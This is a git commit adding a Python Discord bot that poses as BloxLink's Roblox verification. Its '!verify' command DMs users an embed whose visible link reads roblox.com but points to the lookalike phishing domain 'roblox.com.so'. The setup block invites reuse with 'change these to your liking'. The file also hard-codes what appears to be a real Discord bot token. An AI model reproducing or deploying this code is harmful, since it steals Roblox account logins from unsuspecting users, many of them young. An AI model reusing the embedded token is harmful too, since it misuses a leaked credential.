1e0e92fdd9c61b7df3af141289919143a485ce28
azii <85017246+azii7@users.noreply.github.com>
2021-08-07 01:00:54 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,50 @@
+'''
+Creds to karlo#0001 for coding this. 
+Removing these credits will result in a copyright claim
+
+https://discord.gg/notlucid
+
+'''
+
+import discord
+from discord.ext import commands
+import requests
+
+################### change these to your liking ###################
+
+token = "ODczMzMyODc3NzM0MDU2MDI2.YQ24nw.ImREc3-zH3r9DFHDSUjOO1p3te4"
+prefix = "!"
+title = "Please Complete Verification"
+desc ="To verify your account, please join BloxLink\'s Official Roblox Verification Game"
+field = "🔽 Please Login and join the game 🔽"
+hyperlink = "https://roblox.com/games/429530"
+phish = "https://roblox.com.so/games/429530"
+
+###################################################################
+
+
+
+client = commands.Bot(command_prefix = prefix)
+client.remove_command('help')
+
+@client.event
+async def on_ready():
+    print('')
+    print('----------------')
+    print('Selfbot Online!')
+    print('----------------')
+
+main = discord.Embed(title=title,description=desc,color=0xcf4948)
+main.add_field(name=field,value=f"[{hyperlink}]({phish})")
+main.set_thumbnail(url='https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png')
+
+@client.command()
+async def verify(ctx):
+    await ctx.send('***Sent Verification Link! Please Check DMs***')
+    await ctx.author.send(embed=main)
+
+
+
+
+
+client.run(token)
